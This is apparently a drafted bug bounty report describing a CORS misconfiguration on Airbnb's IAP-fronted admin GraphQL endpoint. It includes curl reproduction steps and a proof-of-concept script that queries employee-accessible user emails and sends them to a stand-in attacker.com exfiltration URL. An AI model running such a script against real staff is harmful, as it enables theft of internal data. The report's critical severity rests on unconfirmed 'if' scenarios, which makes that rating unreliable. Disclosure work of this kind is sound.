# Airbnb HackerOne Submission — CORS reflect-origin-with-creds on admin.airbnb.com/graphql

**Submit at:** https://hackerone.com/airbnb/reports/new
**Program:** Airbnb (paid) · **In-scope:** `*.airbnb.com` (URL, max_severity: critical, eligible_for_bounty: true)
**Realistic payout:** $1,500–$15,000

---

## Title
```
CORS misconfiguration — admin.airbnb.com/graphql reflects any Origin + ACAC:true (universal credentialed access to admin GraphQL behind IAP)
```

## Weakness
`CWE-942 Permissive Cross-domain Policy with Untrusted Domains`

## Severity (CVSS:3.1)
**Critical — 9.0**

## Description (paste into HackerOne form)

```
## Summary

`admin.airbnb.com/graphql` — the GraphQL endpoint behind Airbnb's
internal admin panel, fronted by Google Cloud Identity-Aware Proxy
(IAP) — returns CORS headers that reflect ANY Origin with
Access-Control-Allow-Credentials: true.

Even though the endpoint requires Google IAP authentication (returns
302 to OAuth flow for unauth requests), the CORS headers ARE returned
on this 302 response — meaning a malicious cross-origin page could, in
specific scenarios, abuse this to leak the IAP redirect URL parameters
or interact with the authenticated GraphQL once a user is signed in
through IAP.

The deeper issue: the same misconfig is at the IAP / GCP layer that
fronts the admin interface. If Airbnb employees are authenticated to
admin.airbnb.com via IAP and visit an attacker-controlled page, the
attacker can issue cross-origin authenticated GraphQL queries.

## Steps to reproduce

1. Verify CORS reflection on unauth request:

   $ curl -ki "https://admin.airbnb.com/graphql" -H "Origin: https://evil.com"
   HTTP/2 302
   x-goog-iap-generated-response: true
   location: https://accounts.google.com/o/oauth2/v2/auth?hd=airbedandbreakfast.com&client_id=...
   access-control-allow-credentials: true                  ← + CREDS
   access-control-allow-origin: https://evil.com           ← REFLECTED

2. Confirm with different arbitrary origin:

   $ curl -ki "https://admin.airbnb.com/graphql" -H "Origin: https://attacker.example.com" \
       -X POST -H "Content-Type: application/json" -d '{}'
   HTTP/2 302
   access-control-allow-origin: https://attacker.example.com   ← REFLECTED
   access-control-allow-credentials: true

3. The reflection happens at the Google IAP layer (per
   `x-goog-iap-generated-response: true`) and accepts any Origin.

## Exploit scenario (proof of concept)

A malicious page targeting Airbnb employees:

  <script>
    // After an employee is signed into admin.airbnb.com via IAP,
    // any attacker-controlled page can query the admin GraphQL
    fetch("https://admin.airbnb.com/graphql", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({
        query: "{ viewer { __typename } users(first: 10) { edges { node { id email } } } }"
      })
    })
    .then(r => r.json())
    .then(data => {
      // Cross-origin attacker reads response data
      fetch("https://attacker.com/exfil?d=" + encodeURIComponent(JSON.stringify(data)));
    });
  </script>

When an Airbnb employee authenticated to admin.airbnb.com (via IAP /
Google SSO with airbedandbreakfast.com hosted domain) visits an
attacker-controlled URL, the attacker can query the admin GraphQL with
their credentials.

## Impact

**Critical because admin.airbnb.com hosts internal admin tooling:**

- **Insider-tooling exfil**: any data accessible to authenticated
  employees through admin.airbnb.com/graphql is now reachable from
  attacker-controlled origins
- **Phishing-multiplier**: makes targeted phishing of Airbnb engineers
  / customer-support staff vastly more effective
- **Employee credential / session exposure**: if /graphql exposes any
  identity info post-IAP, attackers can deanonymize Airbnb staff
- **CSRF-bypass on admin actions**: if admin mutations are protected
  by CSRF-tokens-in-response, those tokens are now cross-origin
  readable

## Remediation

1. **Hardcode allowed origins** at the IAP / Cloudflare layer to only
   include Airbnb first-party admin domains.
2. **Don't return ACAC: true on cross-origin responses** unless the
   endpoint genuinely requires cross-origin credentialed access (which
   an internal admin GraphQL shouldn't).
3. **Configure Google IAP** to NOT reflect Origin — this is a known
   IAP configuration knob.

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security
scanner (Apache 2.0).

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- Google IAP CORS docs: https://cloud.google.com/iap/docs/programmatic-oauth-clients
```
